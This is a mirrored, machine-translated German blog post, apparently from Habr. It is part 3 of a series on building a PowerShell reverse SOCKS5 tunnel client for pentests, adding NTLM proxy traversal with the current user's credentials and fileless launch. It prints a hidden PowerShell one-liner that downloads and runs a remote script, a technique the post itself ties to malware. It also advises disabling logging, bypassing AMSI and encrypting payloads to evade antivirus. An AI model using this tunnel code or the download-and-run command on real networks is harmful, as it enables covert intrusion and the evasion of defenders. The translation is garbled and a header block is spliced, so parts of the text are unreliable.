<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>üà∫ üòó ‚¨ÖÔ∏è Wir schreiben Reverse socks5 Proxy auf Powershell. Teil 3 üöö üçÖ üñ§</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Die Geschichte von Forschung und Entwicklung in 3 Teilen. Teil 3 ist praktisch. 
 Es gibt viele Buchen - noch mehr Vorteile 

 Fr√ºhere Artikel aus dem...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>Wir schreiben Reverse socks5 Proxy auf Powershell. Teil 3</h1><div class="post__body post__body_full"><div class="post__text post__text-html" id="post-content-body" data-io-article-url="https://habr.com/ru/post/454254/">  Die Geschichte von Forschung und Entwicklung in 3 Teilen.  Teil 3 ist praktisch. <br>  Es gibt viele Buchen - noch mehr Vorteile <br><br>  Fr√ºhere Artikel aus dem Zyklus finden Sie <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">hier</a> und <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">hier</a> =) <br><br><h3>  Battle Check </h3><br>  Lassen Sie uns nun die Funktionsweise unseres Skripts in der Praxis testen.  Versuchen Sie dazu, den Reverse-Tunnel von der virtuellen Maschine (Windows 7.net 4.7) zum Linux VPS auf Digital Ocean zu werfen, und kehren Sie dann mit Win7 zu Win7 zur√ºck.  In diesem Fall simulieren wir eine Situation, in der Windows 7 der Computer des Kunden und Linux VPS unser Server ist. <br><a name="habracut"></a><br>  Unter VPS (in unserem Fall Ubuntu 18.04) installieren und konfigurieren wir den Serverteil von RsocksTun: <br><br><ul><li>  setze den golang: apt installiere golang </li><li>  nimm die Quellen von rsockstun aus der Gita: <br>  Git-Klon <a href="">github.com/mis-team/rsockstun.git</a> / opt / rstun </li><li>  Abh√§ngigkeiten installieren: <br>  Holen Sie sich github.com/hashicorp/yamux <br>  Holen Sie sich github.com/armon/go-socks5 <br>  Holen Sie sich github.com/ThomsonReutersEikon/go-ntlm/ntlm </li><li>  Kompilieren Sie gem√§√ü dem Handbuch: cd / opt / rstun;  Geh bauen </li><li>  SSL-Zertifikat generieren: <br>  openssl req -new -x509 -keyout server.key -out server.crt -days 365 -nodes </li><li>  Wir starten den Serverteil: </li></ul><br><img src="https://habrastorage.org/webt/c6/rx/45/c6rx45gxq1qcabdtdvdczplgq8m.png"><br><br><ul><li>  Wir starten unser Skript auf dem Client und geben ihm den zu verbindenden Server, den Port und das Passwort an: </li></ul><br><img src="https://habrastorage.org/webt/f2/hz/ks/f2hzksob9ctx8qsvrt-p1ycg0fe.png"><br><br><ul><li>  Verwenden Sie den erh√∂hten Port des Socks5-Servers, um zu mail.ru zu gelangen </li></ul><br><img src="https://habrastorage.org/webt/fi/ye/lj/fiyeljrteulwjd0xfihggiovhsk.png"><br><br>  Wie Sie den Screenshots entnehmen k√∂nnen, funktioniert unser Skript.  Wir waren froh, errichteten uns geistig ein Denkmal und entschieden, dass alles perfekt war.  Aber ... <br><br><h3>  Fehlerbehandlung </h3><br>  Aber nicht alles ist so glatt wie wir m√∂chten ... <br><br>  W√§hrend der Ausf√ºhrung des Skripts wurde ein unangenehmer Moment festgestellt: Wenn das Skript √ºber eine nicht sehr schnelle Verbindung zum Server funktioniert, kann der in der folgenden Abbildung gezeigte Fehler beim √úbertragen gro√üer Datenmengen auftreten <br><br><img src="https://habrastorage.org/webt/kb/sd/bn/kbsdbnzfegxlymwrz8bcygd7qeo.png"><br><br>  Nachdem wir diesen Fehler untersucht haben, stellen wir fest, dass wir beim Empfang einer Keepalive-Nachricht (w√§hrend noch Daten an den Server √ºbertragen werden) versuchen, gleichzeitig eine Antwort auf Keepalive auf den Socket zu schreiben, was einen Fehler verursacht. <br><br>  Um die Situation zu korrigieren, m√ºssen wir warten, bis die Daten√ºbertragung abgeschlossen ist, und dann eine Antwort an keepalive senden.  Hier kann jedoch ein anderes Problem auftreten: Wenn im Moment zwischen dem Senden eines 12-Byte-Headers und dem Senden von Daten eine Keepalive-Nachricht eintrifft, wird die Struktur des ymx-Pakets zerst√∂rt.  Eine korrektere L√∂sung w√§re daher die √úbertragung aller Funktionen zum Senden von Daten in yamuxScript, das Ereignisse zum sequentiellen Senden verarbeitet, und es gibt keine solchen Situationen. <br><br>  Um yamuxScript anzuweisen, Keepalive-Antworten zu senden, k√∂nnen wir gleichzeitig unseren gemeinsam genutzten ArrayList StopFlag [0] verwenden - der Nullindex wird nicht verwendet, da  Die Nummerierung der Yamux-Streams beginnt mit 1. In diesem Index √ºbergeben wir in yamuxScript den in der Keepalive-Nachricht empfangenen Ping-Wert.  Standardm√§√üig ist der Wert -1, was bedeutet, dass keine √úbertragung erforderlich ist.  YamuxScript √ºberpr√ºft diesen Wert. Wenn er 0 (der erste Keepalive-Ping = 0) oder mehr ist, senden Sie den √ºbergebenen Wert an die Keepalive-Antwort: <br><br><pre><code class="plaintext hljs">if ($StopFlag[0] -ge 0){ #got yamux keepalive. we have to reply $outbuf = [byte[]](0x00,0x02,0x00,0x02,0x00,0x00,0x00,0x00) + [bitconverter]::getbytes([int32]$StopFlag[0])[3..0] $state.tcpstream.Write($outbuf,0,12) $state.tcpstream.flush() $StopFlag[0] = -1 }</code> </pre> <br>  Wir sollten auch das Senden einer Antwort auf das YMX SYN-Flag im Hauptthread des Programms ausschlie√üen. <br><br>  Dazu m√ºssen wir diese Funktionalit√§t auch in yamuxScript √ºbertragen. Da der yamux-Server jedoch keine Antwort an YMX SYN senden muss und sofort mit dem Senden von Daten beginnt, deaktivieren wir einfach das Senden dieses Pakets und fertig: <br><br><pre> <code class="plaintext hljs">#$outbuf = [byte[]](0x00,0x01,0x00,0x02,$ymxstream[3],$ymxstream[2],$ymxstream[1],$ymxstream[0],0x00,0x00,0x00,0x00) #$tcpstream.Write($outbuf,0,12)</code> </pre> <br>  Danach funktioniert die √úbertragung gro√üer Datenmengen einwandfrei. <br><br><h3>  Proxy-Unterst√ºtzung </h3><br>  Lassen Sie uns nun dar√ºber nachdenken, wie wir unseren Client dazu bringen k√∂nnen, √ºber einen Proxyserver zu arbeiten. <br><br>  Beginnen wir mit den Grundlagen.  Theoretisch ist http-proxy (dh http-Proxys funktionieren in den meisten Unternehmensnetzwerken) so konzipiert, dass es mit dem HTTP-Protokoll funktioniert, und es scheint, dass http nicht nach unserem riecht.  Aber in der Natur gibt es neben http auch https und Ihr Browser kann √ºber regul√§res http eine perfekte Verbindung zu https-Sites herstellen - richtig? <br><br>  Der Grund daf√ºr ist der spezielle Proxy-Server-Betriebsmodus - CONNECT-Modus.  Wenn der Browser √ºber einen Proxyserver √ºber https eine Verbindung zum Google Mail-Server herstellen m√∂chte, sendet er eine CONNECT-Anforderung an den Proxyserver, die den Host- und Zielport angibt. <br><br><pre> <code class="plaintext hljs">CONNECT gmail.com:443 HTTP/1.1 Host: gmail.com:443 Proxy-Connection: Keep-Alive</code> </pre> <br>  Nach einer erfolgreichen Verbindung zum Google Mail-Server gibt der Proxy eine 200-OK-Antwort zur√ºck. <br><br><pre> <code class="plaintext hljs">HTTP/1.1 200 OK</code> </pre> <br>  Danach werden alle Daten vom Browser direkt an den Server √ºbertragen und umgekehrt.  In einfachen Worten, ein Proxy verbindet zwei Netzwerk-Sockets direkt miteinander - einen Browser-Socket und einen Google Mail-Server-Socket.  Danach stellt der Browser eine SSL-Verbindung zum Google Mail-Server her und arbeitet direkt damit. <br><br>  Wenn wir das oben Genannte an unseren Client √ºbertragen, m√ºssen wir zuerst eine Verbindung mit dem Proxyserver herstellen, ein http-Paket senden, das die CONNECT-Methode und die Adresse unseres Yamux-Servers angibt, auf eine Antwort mit Code 200 warten und dann eine SSL-Verbindung herstellen. <br><br>  Grunds√§tzlich gibt es nichts besonders Kompliziertes.  Auf diese Weise wird der Verbindungsmechanismus √ºber den Proxyserver im Golang-Client rsockstun implementiert. <br><br>  Die Hauptschwierigkeiten beginnen, wenn der Proxyserver beim Herstellen einer Verbindung eine NTLM- oder Kerberos-Autorisierung ben√∂tigt. <br><br>  In diesem Fall gibt der Proxyserver den 407-Code und den ntlm-http-Header als base64-Zeichenfolge zur√ºck <br><br><pre> <code class="plaintext hljs">HTTP/1.1 407 Proxy Authentication Required Proxy-Authenticate: NTLM TlRMTVNTUAACAAAAAAAAADgAAABVgphianXk2614u2AAAAAAAAAAAKIAogA4AAAABQEoCgAAAA8CAA4AUgBFAFUAVABFAFIAUwABABwAVQBLAEIAUAAtAEMAQgBUAFIATQBGAEUAMAA2AAQAFgBSAGUAdQB0AGUAcgBzAC4AbgBlAHQAAwA0AHUAawBiAHAALQBjAGIAdAByAG0AZgBlADAANgAuAFIAZQB1AHQAZQByAHMALgBuAGUAdAAFABYAUgBlAHUAdABlAHIAcwAuAG4AZQB0AAAAAAA= Date: Tue, 28 May 2019 14:06:15 GMT Content-Length: 0</code> </pre> <br>  F√ºr eine erfolgreiche Autorisierung m√ºssen wir diese Zeile dekodieren und Parameter daraus entfernen (z. B. ntlm-Challenge, Domainname).  Dann m√ºssen wir unter Verwendung dieser Daten sowie des Benutzernamens und seines ntlm-Hashs eine ntlm-Antwort generieren, sie zur√ºck an base64 codieren und an den Proxyserver zur√ºcksenden. <br><br><pre> <code class="plaintext hljs">CONNECT mail.com:443 HTTP/1.1 Host: mail.com:443 Proxy-Authorization: NTLM TlRMTVNTUAADAAAAGAAYAHoAAAA6AToBkgAAAAwADABYAAAACAAIAGQAAAAOAA4AbAAAAAAAAADMAQAABYKIIgYBsR0AAAAPnHZSXCGeU7zoq64cDFENAGQAbwBtAGEAaQBuAHUAcwBlAHIAVQBTAEUAUgAtAFAAQwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABuxncy1yDsSypAauO/N1TfAQEAAAAAAAAXKmWDXhXVAag3UE8RsOGCAAAAAAIADgBSAEUAVQBUAEUAUgBTAAEAHABVAEsAQgBQAC0AQwBCAFQAUgBNAEYARQAwADYABAAWAFIAZQB1AHQAZQByAHMALgBuAGUAdAADADQAdQBrAGIAcAAtAGMAYgB0AHIAbQBmAGUAMAA2AC4AUgBlAHUAdABlAHIAcwAuAG4AZQB0AAUAFgBSAGUAdQB0AGUAcgBzAC4AbgBlAHQACAAwADAAAAAAAAAAAAAAAAAwAAA2+UpsHCJmpIGttOj1VN+5JbP1D1HvJsbPKpKyd63trQoAEAAAAAAAAAAAAAAAAAAAAAAACQAcAEgAVABUAFAALwAxADIANwAuADAALgAwAC4AMQAAAAAAAAAAAA== User-Agent: curl/7.64.1 Accept: */* Proxy-Connection: Keep-Alive</code> + UpsHCJmpIGttOj1VN + 5JbP1D1HvJsbPKpKyd63trQoAEAAAAAAAAAAAAAAAAAAAAAAACQAcAEgAVABUAFAALwAxADIANwAuADAALgAwAC4AMQAAAAAAAAAAAA == <code class="plaintext hljs">CONNECT mail.com:443 HTTP/1.1 Host: mail.com:443 Proxy-Authorization: NTLM TlRMTVNTUAADAAAAGAAYAHoAAAA6AToBkgAAAAwADABYAAAACAAIAGQAAAAOAA4AbAAAAAAAAADMAQAABYKIIgYBsR0AAAAPnHZSXCGeU7zoq64cDFENAGQAbwBtAGEAaQBuAHUAcwBlAHIAVQBTAEUAUgAtAFAAQwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABuxncy1yDsSypAauO/N1TfAQEAAAAAAAAXKmWDXhXVAag3UE8RsOGCAAAAAAIADgBSAEUAVQBUAEUAUgBTAAEAHABVAEsAQgBQAC0AQwBCAFQAUgBNAEYARQAwADYABAAWAFIAZQB1AHQAZQByAHMALgBuAGUAdAADADQAdQBrAGIAcAAtAGMAYgB0AHIAbQBmAGUAMAA2AC4AUgBlAHUAdABlAHIAcwAuAG4AZQB0AAUAFgBSAGUAdQB0AGUAcgBzAC4AbgBlAHQACAAwADAAAAAAAAAAAAAAAAAwAAA2+UpsHCJmpIGttOj1VN+5JbP1D1HvJsbPKpKyd63trQoAEAAAAAAAAAAAAAAAAAAAAAAACQAcAEgAVABUAFAALwAxADIANwAuADAALgAwAC4AMQAAAAAAAAAAAA== User-Agent: curl/7.64.1 Accept: */* Proxy-Connection: Keep-Alive</code> </pre> <br>  Das ist aber nicht so schlimm.  Tatsache ist, dass wir beim Ausf√ºhren des Skripts weder den Namen des aktuellen Benutzers noch seinen ntlm-Kennwort-Hash kennen.  F√ºr die Autorisierung auf dem Proxyserver m√ºssen wir daher den Benutzernamen / Pass von einem anderen Ort herausfinden. <br><br>  Theoretisch k√∂nnen wir diese Funktionalit√§t in einem Skript implementieren (angefangen beim manuellen Festlegen von Authentifizierungsparametern wie im GoLang-Client bis hin zur Verwendung eines LSASS-Prozessspeicherauszugs wie im Mimikatz), aber dann wird unser Skript insbesondere zu einer unglaublichen Gr√∂√üe und Komplexit√§t dass diese Themen den Rahmen dieses Artikels sprengen. <br><br>  Wir dachten und beschlossen, dass wir den anderen Weg gehen w√ºrden ... <br><br>  Anstatt die Autorisierung manuell durchzuf√ºhren, verwenden wir die integrierte Funktionalit√§t f√ºr die Arbeit mit einem Proxyserver der HTTPWebRequest-Klasse.  In diesem Fall m√ºssen wir jedoch den Code unseres RsocksTun-Servers √§ndern. Wenn er eine Anforderung vom Client empf√§ngt, erwartet er schlie√ülich nur eine Zeichenfolge mit einem Kennwort und eine vollst√§ndige HTTP-Anforderung.  Im Prinzip ist das √Ñndern der Serverseite von rsoskstun nicht so schwierig.  Es muss nur entschieden werden, in welchem ‚Äã‚ÄãTeil der http-Anfrage wir das Passwort √ºbertragen (zum Beispiel der XAuth-http-Header) und die Funktionalit√§t der Verarbeitung der http-Anfrage implementieren, unseren Header mit einem Passwort √ºberpr√ºfen und eine http-R√ºckantwort senden (200 OK).  Wir haben diese Funktionalit√§t einem separaten Zweig des RSocksTun-Projekts hinzugef√ºgt. <br><br>  Nachdem Sie den Golang-Teil von RSocksTun (Server und Client) ge√§ndert haben, werden wir unserem Skript die Funktionalit√§t der Arbeit mit einem Proxyserver hinzuf√ºgen.  Der einfachste Code f√ºr die HttpWebRequest-Klasse zum Herstellen einer Verbindung zu einem Webserver √ºber einen Proxy sieht folgenderma√üen aus: <br><br><pre> <code class="plaintext hljs">[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}; $request = [System.Net.HttpWebRequest]::Create("https://gmail.com:443") $request.Method = "GET" $request.Headers.Add("Xauth","password") $proxy = new-object system.net.webproxy('http://127.0.0.1:8080'); $proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials $request.Proxy = $proxy try {$serverResponse = $request.GetResponse()} catch {write-host "Can not connect"; exit}</code> </pre> <br>  In diesem Fall erstellen wir eine Instanz der HttpWebRequest-Klasse, legen die Eigenschaften Proxy und Anmeldeinformationen fest und f√ºgen den benutzerdefinierten XAuth-http-Header hinzu.  Dementsprechend wird unsere Anfrage an Google-Server √ºber den Proxyserver 127.0.0.1:8080 gesendet.  Wenn der Proxy eine Autorisierung anfordert, "nimmt" Windows selbst die Credits des aktuellen Benutzers auf und f√ºgt die entsprechenden http-Header ein. <br><br>  Anstatt einen Proxyserver manuell anzugeben, k√∂nnen wir die Systemeinstellungen des Proxyservers verwenden: <br><br><pre> <code class="plaintext hljs">$proxy = [System.Net.WebRequest]::GetSystemWebProxy()</code> </pre> <br>  Nachdem wir uns √ºber einen Proxyserver mit unserem rsockstun-Server verbunden und eine HTTP-Antwort mit Code 200 erhalten haben, m√ºssen wir einen kleinen Trick ausf√ºhren, n√§mlich von der HTTPWebRequest-Klasse ein Stream-Objekt zum Lesen / Schreiben wie $ tcpConnection.getStream abrufen ().  Wir tun dies √ºber den .Net Reflection Inspection-Mechanismus (f√ºr diejenigen, die diesen Mechanismus genauer verstehen m√∂chten, teilen Sie den <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Link</a> ).  Dadurch k√∂nnen wir auf die Methoden und Eigenschaften der zugrunde liegenden Klassen zugreifen: <br><br><pre> <code class="plaintext hljs">#--------------------------------------------------------------------------------- # Reflection inspection to retrieve and reuse the underlying networkStream instance $responseStream = $serverResponse.GetResponseStream() $BindingFlags= [Reflection.BindingFlags] "NonPublic,Instance" $rsType = $responseStream.GetType() $connectionProperty = $rsType.GetProperty("Connection", $BindingFlags) $connection = $connectionProperty.GetValue($responseStream, $null) $connectionType = $connection.GetType() $networkStreamProperty = $connectionType.GetProperty("NetworkStream", $BindingFlags) $tcpStream = $networkStreamProperty.GetValue($connection, $null)</code> </pre> <br>  Somit haben wir den gleichen Socket-Stream erhalten, der vom Proxyserver mit unserem Yamux-Server verbunden ist und mit dem wir Lese- / Schreibvorg√§nge ausf√ºhren k√∂nnen. <br><br>  Ein weiterer Punkt, den wir ber√ºcksichtigen m√ºssen, ist der Mechanismus zur √úberwachung des Verbindungsstatus.  Da wir √ºber den Proxyserver und die HTTPWebRequest-Klasse arbeiten, verf√ºgen wir nicht √ºber die Eigenschaft $ tcpConnection.Connected und m√ºssen den Verbindungsstatus auf irgendeine Weise √ºberwachen.  Wir k√∂nnen dies √ºber ein separates $ connect-Flag tun. Es wird nach dem Empfang des 200-Codes vom Proxyserver auf $ true gesetzt und auf $ false zur√ºckgesetzt, wenn beim Lesen aus dem Socket-Stream eine Ausnahme auftritt: <br><br><pre> <code class="plaintext hljs">try { $num = $tcpStream.Read($tmpbuffer,0,12) } catch {$connected=$false; break;} if ($num -eq 0 ) {$connected=$false; break;}</code> </pre> <br>  Ansonsten bleibt unser Code unver√§ndert. <br><br><h3>  Inline-Start </h3><br>  In der Regel f√ºhren alle vern√ºnftigen Benutzer √§hnliche Skripte aus PS1-Dateien aus, aber manchmal (und tats√§chlich - fast immer) w√§hrend des Pentest- / Redtime-Prozesses m√ºssen Module √ºber die Befehlszeile ausgef√ºhrt werden, ohne etwas auf die Festplatte zu schreiben, um keine Spuren zu hinterlassen .  Dar√ºber hinaus k√∂nnen Sie mit Powershell dies √ºber die Befehlszeile tun: <br><br><pre> <code class="plaintext hljs">powershell.exe ‚Äìc &lt;powershell code&gt; powershell.exe ‚Äìe &lt;base64 powershell code&gt;</code> </pre> <br>  Man sollte sich jedoch nicht wirklich in Bezug auf die Geheimhaltung des Startens und Ausf√ºhrens von Befehlen entspannen.  Zum einen wird der gesamte Powershell-Code mit Standard-Windows-Tools in den entsprechenden Ereignisprotokollen (Windows PowerShell und Microsoft-Windows-PowerShell / Operational) protokolliert, und zum anderen wird der gesamte in Powershell ausgef√ºhrte Code √ºber den AMSI-Mechanismus ( Anti-Malware-Scan-Schnittstelle).  Eine andere Sache ist, dass diese beiden Mechanismen bei unkomplizierten Aktionen absolut kostspielig sind.  Das Deaktivieren von Magazinen und das Umgehen von AMSI ist ein separates Diskussionsthema, √ºber das wir in zuk√ºnftigen Artikeln oder in unserem Kanal schreiben werden.  Aber jetzt ein bisschen √ºber etwas anderes. <br><br>  Tatsache ist, dass unser Skript eine ziemlich beeindruckende Gr√∂√üe erreicht hat und es klar ist, dass es in keine Befehlszeile passt (cmd-Limit in Windows betr√§gt 8191 Zeichen).  Daher m√ºssen wir eine M√∂glichkeit finden, unser Skript auszuf√ºhren, ohne es auf die Festplatte zu schreiben.  Und hier helfen uns die von Malware verwendeten Standardmethoden seit fast 15 Jahren.  Kurz gesagt, die Regel ist einfach - herunterladen und ausf√ºhren.  Die Hauptsache ist, es nicht zu verwechseln =) <br>  Der Befehl zum Herunterladen und Starten sieht folgenderma√üen aus: <br><br><pre> <code class="plaintext hljs">powershell.exe ‚Äìw hidden -c "IEX ((new-object net.webclient).downloadstring('http://url.com/script.ps1'))"</code> </pre> <br>  Sie k√∂nnen noch mehr Inline- <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Startoptionen</a> auf dem <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">HarmJ0y</a> 'I' s <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Git finden</a> : <br><br>  Vor dem Herunterladen m√ºssen Sie nat√ºrlich die Protokolle deaktivieren und AMSI umgehen oder deaktivieren.  Das Skript selbst muss vor dem Herunterladen verschl√ºsselt werden, weil  W√§hrend des Download-Vorgangs wird es nat√ºrlich von Ihrem (oder nicht Ihrem =) Antivirenprogramm auf und ab √ºberpr√ºft und vor dem Start entsprechend entschl√ºsselt.  Wie das geht - Sie, der Leser, sollten es sich schon selbst einfallen lassen.  Dies w√ºrde den Rahmen dieses Themas sprengen.  Aber wir kennen einen coolen Spezialisten in dieser Angelegenheit - den allm√§chtigen Google.  Es gibt zahlreiche Beispiele f√ºr die Ver- und Entschl√ºsselung im Netzwerk sowie Beispiele f√ºr die Umgehung von AMSI. <br><br><h3>  Fazit zu allen Teilen </h3><br>  Dabei haben wir den Leser in die Technologie der ‚ÄûUmkehrtunnel‚Äú und deren Verwendung f√ºr Pentests eingef√ºhrt, einige Beispiele f√ºr solche Tunnel gezeigt und √ºber die Vor- und Nachteile ihrer Verwendung gesprochen. <br><br>  Es ist uns auch gelungen, einen Powershell-Client f√ºr den RsocksTun-Server mit den folgenden Funktionen zu erstellen: <br><br><ul><li>  SSL-Verbindungen </li><li>  Autorisierung auf dem Server; </li><li>  Arbeit mit Yamux-Server mit Unterst√ºtzung f√ºr Keepalive-Pings; </li><li>  Multithread-Betriebsart; </li><li>  Unterst√ºtzung der Arbeit √ºber einen Proxy-Server mit Autorisierung. </li></ul><br>  Sie finden den gesamten rsockstun-Code (Golang und Powershell) im entsprechenden Zweig <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">auf unserem Github.</a>  Der Hauptzweig funktioniert ohne Proxyserver, und der Zweig via_proxy funktioniert √ºber Proxys und HTTP. <br><br>  Wir freuen uns √ºber Ihre Kommentare und Vorschl√§ge zur Verbesserung des Codes und der Anwendbarkeit der Entwicklung in der Praxis. <br><br>  Damit ist der Zyklus unserer Artikel zum umgekehrten Tunneln abgeschlossen.  Wir hoffen sehr, dass Sie daran interessiert sind, uns zu lesen, und die Informationen sind n√ºtzlich. </div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/de454254/">https://habr.com/ru/post/de454254/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../de454240/index.html">Wavelet-Analyse. Teil 3</a></li>
<li><a href="../de454242/index.html">"Schau, was f√ºr ein Jetpack ich habe!" "Ha, schau was f√ºr eine Rakete ich habe!" (Notizen von der Raketenmeisterschaft)</a></li>
<li><a href="../de454246/index.html">Verschiedene Koordinaten, die in der Unity3d-Benutzeroberfl√§che verwendet werden</a></li>
<li><a href="../de454248/index.html">Leibeigene im Zeitalter der k√ºnstlichen Intelligenz</a></li>
<li><a href="../de454252/index.html">Selbst die Webressourcen bekannter Organisationen sind nicht vor Fehlern von Kindern gesch√ºtzt.</a></li>
<li><a href="../de454256/index.html">Was ist los mit unserer IT</a></li>
<li><a href="../de454260/index.html">Bad Code Kindertag</a></li>
<li><a href="../de454262/index.html">Warum jeder Datenwissenschaftler Dask kennen sollte</a></li>
<li><a href="../de454264/index.html">4 sinnvolle Youtube-Kan√§le zu technischen Interviews</a></li>
<li><a href="../de454266/index.html">Dell und Alienware auf der Computex 2019: Sprechen Sie √ºber wichtige Innovationen</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>